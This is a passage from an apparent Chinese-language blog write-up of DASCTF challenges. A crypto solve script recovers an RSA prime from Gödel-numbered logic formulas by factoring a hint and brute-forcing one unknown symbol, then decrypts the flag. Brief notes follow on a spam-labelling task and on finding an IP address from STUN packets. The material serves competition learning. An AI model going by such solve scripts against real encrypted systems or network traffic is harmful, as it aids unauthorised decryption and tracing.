<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="The-Mystery-of-Math"><a href="#The-Mystery-of-Math" class="headerlink" title="The Mystery of Math"></a>The Mystery of Math</h3><p>题目是让我们输入一个逻辑式（这里我以<img src="https://cdn.nlark.com/yuque/__latex/26fdbf8e53cb0e48da5f4ddd4aaf5a5c.svg#card=math&code=a&id=VG3DP">来指代），然后会返回给我们以下信息：</p>
<blockquote>
<p>1，密文：<img src="https://cdn.nlark.com/yuque/__latex/d3b74188e1ddca1fe5a431c3193c7bc7.svg#card=math&code=c%3Dm%5Ee~mod~n&id=i4Hug"><br>2，模数：<img src="https://cdn.nlark.com/yuque/__latex/df378375e7693bdcf9535661c023c02e.svg#card=math&code=n&id=tn1TK"><br>3，提示：<img src="https://cdn.nlark.com/yuque/__latex/f6a24b8141727a67144c6e789a7e2040.svg#card=math&code=tip%3Dgcd%28CNF%28a%29%2C~DNF%28a%29%29&id=RPjU2"><br>（其中CNF(a)是a的合取范式，DNF(a)是a的析取范式）</p>
</blockquote>
<p>既然是这样的话，我们肯定得利用点小trick——<strong>找一个使得</strong><img src="https://cdn.nlark.com/yuque/__latex/e58d9363be0335fffb8d76e5d6e3a35c.svg#card=math&code=CNF%28a%29%3DDNF%28a%29&id=fo4Sm"><strong>的逻辑式</strong><img src="https://cdn.nlark.com/yuque/__latex/26fdbf8e53cb0e48da5f4ddd4aaf5a5c.svg#card=math&code=a&id=jjmh0"><br>因为这样的话，便有：<img src="https://cdn.nlark.com/yuque/__latex/3bf203865a5e0c10365e207681f8f77e.svg#card=math&code=tip%3Dgcd%28CNF%28a%29%2C~DNF%28a%29%29%3DCNF%28a%29&id=mhyEL"><br>我这里用的是这个：<strong>p∧q∧r∧s</strong>，那么对应的CNF(a)便是：**(p∧q∧r∧s)<strong>。<br>这样就有一部分符号所对应的随机数<img src="https://cdn.nlark.com/yuque/__latex/24a00a92acccd2f5795d9a6932687462.svg#card=math&code=r_i&id=dlDME">了<br>然后本以为结束了，但是发现random_pro的未知信息太多了，爆不了；所以我们可以反复交互靶机，去找到一个“</strong>除去p里的符号以外，剩下的未知信息极少**”的random_pro及tip，最后去爆破此时random_pro的未知信息所对应的随机数，计算出素数p后进行RSA解密即可。<br>这里比较巧合的是——我交互出只有一位不知道的random_pro，所以进行一个23次的循环就行。<br>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage10.3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">交互得到的信息</span></span><br><span class="line"><span class="string">Please enter a proposition (up to four variables, e.g. p ∧ q): p∧q∧r∧s</span></span><br><span class="line"><span class="string">random_pro: (q∧p)∧(p∧p→q)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c: 41995810424050464263591488554448329862268580803509430819016224815553338100888730896803336612673840017823427423514275862910733716684469925016536292401838549242607815557380733283312997155937593349267904769325582237443602584182267833691493238910650296499006238737051108479</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n: 55175127952509866925917683580771159604579625153201086866979697201304022611177281378259399324843229832453057891022941155251249573902422749989427069699961969897437050838279218610819986530616258141599622993673644866656585227220278835105482801123826751956496319091479635337</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tip: 12114630541506105101731501666541981434969941617155098749915270357037632891606470511445503452415625000000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Godel</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, <span class="built_in">dict</span></span>):</span><br><span class="line">        self.table = [<span class="string">&#x27;﹁&#x27;</span>, <span class="string">&#x27;∨&#x27;</span>, <span class="string">&#x27;∧&#x27;</span>, <span class="string">&#x27;→&#x27;</span>, <span class="string">&#x27;↔&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;t&#x27;</span>]</span><br><span class="line">        self.<span class="built_in">dict</span> = <span class="built_in">dict</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_dict</span>(<span class="params">self, max_value=<span class="number">30</span></span>):</span><br><span class="line">        res = &#123;&#125;</span><br><span class="line">        used = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> self.table:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                r = randint(<span class="number">1</span>, max_value)</span><br><span class="line">                <span class="keyword">if</span> r <span class="keyword">not</span> <span class="keyword">in</span> used:</span><br><span class="line">                    res[k] = r</span><br><span class="line">                    used.add(r)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_primes</span>(<span class="params">self, count, start=<span class="number">2</span></span>):</span><br><span class="line">        primes = []</span><br><span class="line">        tmp = start</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(primes) &lt; count:</span><br><span class="line">            primes.append(tmp)</span><br><span class="line">            tmp = next_prime(tmp)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">self, seq</span>):</span><br><span class="line">        p = self.generate_primes(<span class="built_in">len</span>(seq))</span><br><span class="line">        gn = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> c, prime <span class="keyword">in</span> <span class="built_in">zip</span>(seq, p):</span><br><span class="line">            gn *= prime ** self.<span class="built_in">dict</span>[c]</span><br><span class="line">        <span class="keyword">return</span> gn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c= <span class="number">41995810424050464263591488554448329862268580803509430819016224815553338100888730896803336612673840017823427423514275862910733716684469925016536292401838549242607815557380733283312997155937593349267904769325582237443602584182267833691493238910650296499006238737051108479</span></span><br><span class="line">n= <span class="number">55175127952509866925917683580771159604579625153201086866979697201304022611177281378259399324843229832453057891022941155251249573902422749989427069699961969897437050838279218610819986530616258141599622993673644866656585227220278835105482801123826751956496319091479635337</span></span><br><span class="line">tip= <span class="number">12114630541506105101731501666541981434969941617155098749915270357037632891606470511445503452415625000000</span></span><br><span class="line">p = <span class="number">2</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">    table = [<span class="string">&#x27;﹁&#x27;</span>, <span class="string">&#x27;∨&#x27;</span>, <span class="string">&#x27;∧&#x27;</span>, <span class="string">&#x27;→&#x27;</span>, <span class="string">&#x27;↔&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;t&#x27;</span>]</span><br><span class="line">    dic = &#123;i: <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> table&#125;</span><br><span class="line">    <span class="comment"># print(dic)</span></span><br><span class="line">    <span class="comment"># 题目的合取范式是(p)，需要注意一下</span></span><br><span class="line">    cs = <span class="string">&quot;(p∧q∧r∧s)&quot;</span></span><br><span class="line">    <span class="comment"># ds = (p∧q∧r∧s)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cs:</span><br><span class="line">        <span class="keyword">if</span> dic[i] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> tip % p == <span class="number">0</span>:</span><br><span class="line">                tip //= p</span><br><span class="line">                dic[i] += <span class="number">1</span></span><br><span class="line">            p = next_prime(p)</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;i&#125;: &#123;dic[i]&#125;&quot;, end=&quot;\n&quot;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip //= p**dic[i]</span><br><span class="line">            p = next_prime(p)</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line">table = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>) <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> dic.values()]</span><br><span class="line"><span class="comment"># len(table)=23</span></span><br><span class="line"><span class="comment"># 给的random_pro</span></span><br><span class="line">tar = <span class="string">&quot;(q∧p)∧(p∧p→q)&quot;</span></span><br><span class="line"><span class="comment"># 未知信息</span></span><br><span class="line">tar1 = <span class="string">&quot;→&quot;</span></span><br><span class="line"><span class="comment"># 因为len(tar1)=1, 所以只需爆破23种可能性</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(table):</span><br><span class="line">    dic1 = dic</span><br><span class="line">    dic1[tar1] = i</span><br><span class="line">    g = Godel(dic1)</span><br><span class="line">    p = g.translate(tar)</span><br><span class="line">    p = next_prime(p)</span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        e = <span class="number">65537</span></span><br><span class="line">        d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># DASCTF&#123;c5aad793-87c0-434a-89db-b750340ef842&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="badmes"><a href="#badmes" class="headerlink" title="badmes"></a>badmes</h3><p>采用最古老的办法，人工判断，是垃圾短信输1，一直到达240分<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1713607498515-ccf94d2d-caec-4478-a8d5-46a7930d4502.png#averageHue=%23252525&clientId=u0c6669cc-0448-4&from=paste&height=255&id=uece0ba83&originHeight=382&originWidth=692&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=48234&status=done&style=none&taskId=u98ace2dd-381f-4662-a119-dfeb60196cb&title=&width=461.3333333333333" alt="{2D1B346F-26D0-4a4a-A020-5B1A2967AA4B}.png"></p>
<h3 id="tele"><a href="#tele" class="headerlink" title="tele"></a>tele</h3><p>根据<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26797664">https://zhuanlan.zhihu.com/p/26797664</a>对P2P通信标准协议之STUN的分析，我们可以轻易地找到发起者的ip<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1713607769286-a4279d92-57b2-4fa4-949f-1db91b30cd2a.png#averageHue=%23f1f1f2&clientId=u0c6669cc-0448-4&from=paste&height=415&id=u9a081c70&originHeight=622&originWidth=1141&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=100106&status=done&style=none&taskId=u95e0c583-fc68-42a4-b523-dc8721bd564&title=&width=760.6666666666666" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1713610140068-47c32099-b91b-4e34-a138-f74658626cd8.png#averageHue=%23cae0f3&clientId=u0c6669cc-0448-4&from=paste&height=698&id=u7cf91d38&originHeight=1047&originWidth=2560&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=367674&status=done&style=none&taskId=ud9f972e0-3be5-4dca-a993-5a207c07381&title=&width=1706.6666666666667" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/DASCTF/" class="tag">#DASCTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/04/30/%E5%87%8C%E6%AD%A6%E6%9D%AF%20x%20D%5E3CTF%20Web%20Writeup%202024/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">2024 凌武杯 x D^3CTF Web Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/04/27/%E4%BD%A0%E6%83%B3%E8%A6%81%E6%B4%BB%E5%87%BA%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E4%BA%BA%E7%94%9F%EF%BC%9F/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">你想要活出什么样的人生？</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>